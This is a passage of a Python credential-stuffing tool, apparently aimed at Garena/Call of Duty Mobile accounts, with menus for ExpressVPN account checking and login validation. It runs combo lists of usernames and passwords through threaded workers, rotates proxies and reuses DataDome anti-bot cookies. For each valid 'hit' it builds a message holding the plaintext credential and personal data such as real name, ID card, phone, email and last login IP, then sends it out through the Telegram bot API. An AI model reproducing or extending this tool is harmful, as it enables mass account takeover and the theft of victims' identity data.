    datadome_manager = DataDome()
    live_stats = Stats()
    live_stats.total_count = len(accounts)

    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
        except Exception:
            pass
    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
                d = _j.load(_f)
            if d.get('token') and d.get('chat_id'):
                return d
        except Exception:
            pass
        return None
    _saved_tg = _tg_load()

    print_box_header(" TELEGRAM NOTIFICATION ", OCHRE)
    print_box_line(f"{SOFT_WHITE}1{RESET}  {OCHRE}›{RESET}  {WARM_GRAY}Send Clean hits only{RESET}")
    print_box_line(f"{SOFT_WHITE}2{RESET}  {OCHRE}›{RESET}  {WARM_GRAY}Send Not-Clean hits only{RESET}")
    print_box_line(f"{SOFT_WHITE}3{RESET}  {OCHRE}›{RESET}  {WARM_GRAY}Send Both (clean + not-clean){RESET}")
    print_box_line(f"{SOFT_WHITE}4{RESET}  {WARM_GRAY}›  No Telegram (skip){RESET}")
    print_box_footer()
    print()

    tg_choice = ''
    while tg_choice not in ('1', '2', '3', '4'):
        tg_choice = input(f'  {OCHRE}➤{RESET} ').strip()
    TG_ENABLED = tg_choice != '4'
    TG_SEND_CLEAN = tg_choice in ('1', '3')
    TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
    TG_BOT_TOKEN = ''
    TG_CHAT_ID = ''
    TG_LVL_MIN_CLEAN = 0
    TG_LVL_MAX_CLEAN = 400
    TG_LVL_MIN_NOTCLEAN = 0
    TG_LVL_MAX_NOTCLEAN = 400

    if TG_ENABLED:
        print()
        if _saved_tg:
            _masked = f"...{_saved_tg['token'][-6:]}" if len(_saved_tg['token']) > 6 else '******'
            print(f"  {SAGE}✔  Saved config found{RESET}  {WARM_GRAY}Token: {_masked}  |  Chat: {_saved_tg['chat_id']}{RESET}")
            _use_saved = input(f'  {OCHRE}➤ Use saved config? (y/n){RESET}  {OCHRE}➤{RESET} ').strip().lower()
            if _use_saved == 'y':
                TG_BOT_TOKEN = _saved_tg['token']
                TG_CHAT_ID = _saved_tg['chat_id']
                _cr = _saved_tg.get('clean', [0, 9999])
                _nr = _saved_tg.get('nc', [0, 9999])
                TG_LVL_MIN_CLEAN = _cr[0] if TG_SEND_CLEAN else 0
                TG_LVL_MAX_CLEAN = _cr[1] if TG_SEND_CLEAN else 9999
                TG_LVL_MIN_NOTCLEAN = _nr[0] if TG_SEND_NOTCLEAN else 0
                TG_LVL_MAX_NOTCLEAN = _nr[1] if TG_SEND_NOTCLEAN else 9999
                _log('SUCCESS', 'Using saved config.')
            else:
                _saved_tg = None
        if not _saved_tg:
            TG_BOT_TOKEN = input(f'  {OCHRE}➤ Bot Token{RESET}  {OCHRE}➤{RESET} ').strip()
            TG_CHAT_ID = input(f'  {OCHRE}➤ Chat ID{RESET}  {OCHRE}➤{RESET} ').strip()
            if TG_SEND_CLEAN:
                print()
                print(f'  {WARM_GRAY}Level range for {SAGE}CLEAN{RESET}{WARM_GRAY} hits — format: min-max (e.g. 50-400){RESET}')
                raw_clean = input(f'  {SAGE}➤ Clean level range (Enter = all){RESET}  {SAGE}➤{RESET} ').strip()
                if raw_clean and '-' in raw_clean:
                    try:
                        parts = raw_clean.split('-')
                        TG_LVL_MIN_CLEAN = int(parts[0].strip())
                        TG_LVL_MAX_CLEAN = int(parts[1].strip())
                    except Exception:
                        pass
            if TG_SEND_NOTCLEAN:
                print()
                print(f'  {WARM_GRAY}Level range for {TERRACOTTA}NOT-CLEAN{RESET}{WARM_GRAY} hits — format: min-max (e.g. 1-200){RESET}')
                raw_nc = input(f'  {TERRACOTTA}➤ Not-clean level range (Enter = all){RESET}  {TERRACOTTA}➤{RESET} ').strip()
                if raw_nc and '-' in raw_nc:
                    try:
                        parts = raw_nc.split('-')
                        TG_LVL_MIN_NOTCLEAN = int(parts[0].strip())
                        TG_LVL_MAX_NOTCLEAN = int(parts[1].strip())
                    except Exception:
                        pass
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
                _log('SUCCESS', 'Config saved for next time.')
        print()
        _log('SUCCESS', 'Telegram configured.')
        if TG_SEND_CLEAN:
            print(f'  {WARM_GRAY}Clean hits  : Level {SAGE}{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}{RESET}')
        if TG_SEND_NOTCLEAN:
            print(f'  {WARM_GRAY}Not-clean   : Level {TERRACOTTA}{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}{RESET}')
        print()

    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'NOT CONNECTED')
        fb_link = ad.get('fb_link', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        status = ad.get('account_status', 'N/A')
        real_name = ad.get('real_name', 'N/A')
        id_card = ad.get('id_card', 'N/A')
        id_card_len = ad.get('id_card_length', 'N/A')
        signature = ad.get('signature', 'N/A')
        avatar = ad.get('avatar', 'N/A')
        suspicious = "Yes" if ad.get('suspicious', False) else "No"
        pw_strength = ad.get('password_strength', 'N/A')
        email_ver_time = ad.get('email_verified_time', 'N/A')
        whitelistable = "Yes" if ad.get('whitelistable', False) else "No"
        realinfo_upd = "Yes" if ad.get('realinfo_updatable', False) else "No"
        account_created = ad.get('account_created', 'N/A')
        last_login_ip = ad.get('last_login_ip', 'N/A')
        two_step = "Yes" if ad.get('two_step_verify', False) else "No"
        auth_app = "Yes" if ad.get('authenticator_app', False) else "No"
        tag = '✨ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
        lines = [
            f"{'✨ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}",
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Credential: {acc}:{pwd}',
            f'Status: {tag}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Nickname: {nick}',
            f'UID: {uid}',
            f'Level: {lvl}',
            f'Region: {region}',
            f'Country: {country}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Email: {email_d}',
            f'Mobile: {mobile}',
            f'Facebook: {fb}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Real Name: {real_name}',
            f'ID Card: {id_card}',
            f'ID Card Len: {id_card_len}',
            f'Signature: {signature}',
            f'Avatar: {avatar}',
            f'Suspicious: {suspicious}',
            f'Password Str: {pw_strength}',
            f'Account Created: {account_created}',
            f'Email Verified: {email_ver_time}',
            f'Whitelistable: {whitelistable}',
            f'RealInfo Upd: {realinfo_upd}',
            f'2FA: {two_step}',
            f'Auth App: {auth_app}',
            f'Last Login IP: {last_login_ip}',
            f'Last Login: {login_d}',
            f'Login Via: {login_w}',
            f'Shells: {shell}',
            f'Acc Status: {status}',
        ]
        if fb_link != 'N/A':
            lines.append(f'FB Link: {fb_link}')
        lines.append(f'━━━━━━━━━━━━━━━━━━━━━━━━━━')
        lines.append(f'Powered by: @lleessiee')
        return '\n'.join(lines)

    def _send_tg(token, chat_id, text, silent=False):
        try:
            import urllib.request as _ur, urllib.parse as _up
            payload = {'chat_id': chat_id, 'text': text, 'disable_notification': silent, 'parse_mode': 'HTML'}
            data = _up.urlencode(payload).encode()
            req = _ur.Request(f'https://api.telegram.org/bot{token}/sendMessage', data=data, method='POST')
            _ur.urlopen(req, timeout=8)
        except Exception:
            pass

    def _maybe_send_tg(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        acc = account_data.get('account', '')
        pwd = account_data.get('password', '')
        msg = _build_tg_message(acc, pwd, account_data, is_clean)
        if TG_ENABLED:
            if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
            elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()

    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg

    clear_screen()
    display_banner()

    w_summary = _w(68)
    def print_summary_line(content):
        clean = strip_ansi(content)
        pad = (w_summary - 4) - len(clean)
        if pad < 0:
            pad = 0
        print(f"  {WARM_GRAY}║{content}{' ' * pad}{WARM_GRAY}║{RESET}")

    print(f"  {WARM_GRAY}╔{'═' * (w_summary - 4)}╗{RESET}")
    title = " PRE-CHECK SUMMARY "
    clean_title = strip_ansi(title)
    title_pad = (w_summary - 4) - len(clean_title)
    if title_pad < 0:
        title_pad = 0
    print(f"  {WARM_GRAY}║{OCHRE}{title}{RESET}{' ' * title_pad}{WARM_GRAY}║{RESET}")
    print(f"  {WARM_GRAY}╠{'═' * (w_summary - 4)}╣{RESET}")

    label_width = 20
    print_summary_line(
        f"{SOFT_WHITE}{'ACCOUNTS LOADED:':<{label_width}}{RESET} {SAGE}{len(accounts):,}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'THREADS CHOSEN:':<{label_width}}{RESET} {DUSTY_ROSE}{num_threads}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'VALID COOKIES:':<{label_width}}{RESET} {OCHRE}{len(cookie_manager.get_valid_cookies())}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'PROXIES:':<{label_width}}{RESET} {SAGE}{len(proxy_manager.proxies)}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'AUTO-REMOVE:':<{label_width}}{RESET} {SAGE if auto_remove else TERRACOTTA}{'ENABLED' if auto_remove else 'DISABLED'}{RESET}"
    )

    print(f"  {WARM_GRAY}╚{'═' * (w_summary - 4)}╝{RESET}\n")

    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    global _suppress_ip_prints, _ip_block_callback
    _suppress_ip_prints = True
    def _ip_block_cb(blocked: bool):
        pass
    _ip_block_callback = _ip_block_cb
    _thread_local = threading.local()
    print("\n" * GARENA_UI_HEIGHT)

    def _get_thread_resources():
        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
            _thread_local.session = requests.Session()
            _thread_local.datadome = DataDome()
            if proxy_manager and proxy_manager.is_loaded():
                _thread_local.session.proxies.update(proxy_manager.get_next())
            proxy_dict = dict(_thread_local.session.proxies) if proxy_manager and proxy_manager.is_loaded() else None
            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                combined = '; '.join(valid_cookies)
                applyck(_thread_local.session, combined)
                dd_line = valid_cookies[-1]
                if 'datadome=' in dd_line:
                    for part in dd_line.split(';'):
                        part = part.strip()
                        if part.startswith('datadome='):
                            _thread_local.datadome.set_datadome(part.split('=', 1)[1].strip())
                            break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        return (_thread_local.session, _thread_local.datadome)

    def _worker(account_line):
        if ':' not in account_line:
            return
        try:
            account, password = account_line.split(':', 1)
            account = account.strip()
            password = password.strip()
            session, datadome_mgr = _get_thread_resources()

            if num_threads <= 25:
                retries = 4
                retry_delay = 0.8
            elif num_threads <= 50:
                retries = 3
                retry_delay = 0.5
            elif num_threads <= 75:
                retries = 2
                retry_delay = 0.2
            else:
                retries = 1
                retry_delay = 0.0

            with stats_lock:
                nonlocal overall_done
                overall_done += 1
                stats = live_stats.get_stats()
                sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
                sys.stdout.flush()
                print(build_live_stats_ui(stats, 75))

            result = processaccount(
                session, account, password, cookie_manager, datadome_mgr,
                live_stats, results_manager, file_manager, selected_file,
                auto_remove, suppress_print=True, proxy_manager=proxy_manager,
                max_retries=retries, retry_delay=retry_delay
            )

            with stats_lock:
                stats = live_stats.get_stats()
                sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
                sys.stdout.flush()

                if "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs" in result or "ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ" in result:
                    print(f"sᴜᴄᴄᴇss ➻ {result}")
                else:
                    print(result)
                print(f"   {DUSTY_ROSE}───────────────────────────────────────────────────────{RESET}")
                print(build_live_stats_ui(stats, 75))

            if proxy_manager and proxy_manager.is_loaded():
                proxy_manager.get_next()

        except Exception as e:
            print(f"sᴜᴄᴄᴇss ➻ {account_line.split(':', 1)[0]} — ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

    def _wrapped_worker(account_line):
        with index_lock:
            account_index_counter[0] += 1
            my_index = account_index_counter[0]
        retry_count = 0
        acc_name = account_line.split(':', 1)[0].strip() if ':' in account_line else account_line
        while True:
            status, acc_name, account_data = _worker(account_line)
            if status == 'IP_CHANGED':
                if hasattr(_thread_local, 'session'):
                    try:
                        _thread_local.session.close()
                    except Exception:
                        pass
                    del _thread_local.session
                if hasattr(_thread_local, 'datadome'):
                    del _thread_local.datadome
                retry_count += 5
                time.sleep(5)
                continue
            break
        result_info = live_stats.pop_result()
        if result_info and result_info['success']:
            pass
        with stats_lock:
            pass

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
        for future in as_completed(futures):
            try:
                future.result()
                if live_stats.get_stats()['checked'] % 50 == 0 or live_stats.get_stats()['checked'] == len(accounts):
                    with stats_lock:
                        stats = live_stats.get_stats()
                        sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
                        sys.stdout.flush()
                        print(build_live_stats_ui(stats, 75))
            except Exception:
                with stats_lock:
                    pass

    sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
    sys.stdout.flush()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()

    stats = live_stats.get_stats()
    display_summary(
        stats.get('checked', 0),
        stats.get('invalid', 0),
        stats.get('valid', 0),
        live_stats.categorized_levels,
        live_stats.countries,
        len(accounts),
        live_stats.highest_clean,
        live_stats.highest_not_clean,
        live_stats.highest_shells
    )
    results_manager.db_flush_final()
    _flush_auto_remove(file_manager, selected_file, force=True)
    print(f'  {WARM_GRAY}Results saved in real-time to Results/{RESET}')
    print()
    input(f'  {OCHRE}Press Enter to return to menu.{RESET}')

def display_main_menu():
    w = _w(68)
    left = "  "

    def strip_ansi(t):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', t)

    def print_box_line(content):
        clean = strip_ansi(content)
        pad = (w - 4) - len(clean)

        if pad < 0:
            pad = 0

        print(
            f"{left}{WARM_GRAY}║"
            f"{content}"
            f"{' ' * pad}"
            f"{WARM_GRAY}║{RESET}"
        )

    print()

    print(
        f"{left}{WARM_GRAY}"
        f"╔{'═' * (w - 4)}╗"
        f"{RESET}"
    )

    guide_title = " ◇  OPERATION GUIDE "
    clean_guide_title = strip_ansi(guide_title)
    guide_pad = (w - 4) - len(clean_guide_title)

    print(
        f"{left}{WARM_GRAY}║"
        f"{CLAY}{guide_title}{RESET}"
        f"{' ' * max(0, guide_pad)}"
        f"{WARM_GRAY}║{RESET}"
    )

    print(
        f"{left}{WARM_GRAY}"
        f"╠{'═' * (w - 4)}╣"
        f"{RESET}"
    )

    guide = [
        (
            "Garena",
            "Process multiple Garena credentials."
        ),
        (
            "ExpressVPN",
            "Check VPN account credentials and status."
        ),
        (
            "Validator",
            "Perform garena login-only account validation."
        ),
        (
            "Exit",
            "Safely close the application."
        ),
    ]

    for label, description in guide:
        raw = (
            f" {DUSTY_ROSE}›{RESET} "
            f"{SOFT_WHITE}{label:<11}{RESET}"
            f"{WARM_GRAY}│{RESET} "
            f"{WARM_GRAY}{description}{RESET}"
        )

        print_box_line(raw)

    print(
        f"{left}{WARM_GRAY}"
        f"╚{'═' * (w - 4)}╝"
        f"{RESET}"
    )

    print()

    print(
        f"{left}{WARM_GRAY}"
        f"╔{'═' * (w - 4)}╗"
        f"{RESET}"
    )

    title = " ◈  OPERATIONS MENU  ◈ "
    clean_title = strip_ansi(title)
    title_pad = (w - 4) - len(clean_title)

    print(
        f"{left}{WARM_GRAY}║"
        f"{DUSTY_ROSE}{title}{RESET}"
        f"{' ' * max(0, title_pad)}"
        f"{WARM_GRAY}║{RESET}"
    )

    print(
        f"{left}{WARM_GRAY}"
        f"╠{'═' * (w - 4)}╣"
        f"{RESET}"
    )

    items = [
        (
            "1",
            "⚙ Garena Credential Processing",
            DUSTY_ROSE
        ),
        (
            "2",
            "⎋ ExpressVPN Account Fetcher",
            CLAY
        ),
        (
            "3",
            "✔ Garena Login Validator",
            OCHRE
        ),
        (
            "4",
            "✖ Exit Application",
            TERRACOTTA
        ),
    ]

    for num, label, accent in items:
        raw = (
            f" {SOFT_WHITE}{num}{RESET}"
            f"  {accent}›{RESET}"
            f"  {SOFT_WHITE}{label}{RESET}"
        )

        print_box_line(raw)

    print(
        f"{left}{WARM_GRAY}"
        f"╚{'═' * (w - 4)}╝"
        f"{RESET}"
    )

    print()

    while True:
        try:
            choice = input(
                f"  {DUSTY_ROSE}➤{RESET} "
            ).strip()

            if choice in ("1", "2", "3", "4"):
                return choice

            _log(
                "ERROR",
                "Enter 1, 2, 3, or 4."
            )

        except KeyboardInterrupt:
            return "4"

def main():
    while True:
        clear_screen()
        display_banner()
        choice = display_main_menu()
        if choice == '1':
            bulk_check()
        elif choice == '2':
            expressvpn_check()
        elif choice == '3':
            validator_check()
        elif choice == '4':
            print(f"\n  {SAGE}Exiting...{RESET}")
            break

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {OCHRE}⚠  Script terminated by user.{RESET}\n')
    except Exception as e:
        import traceback
        print(f'\n  {TERRACOTTA}✖  Unexpected error: {e}{RESET}')
        traceback.print_exc()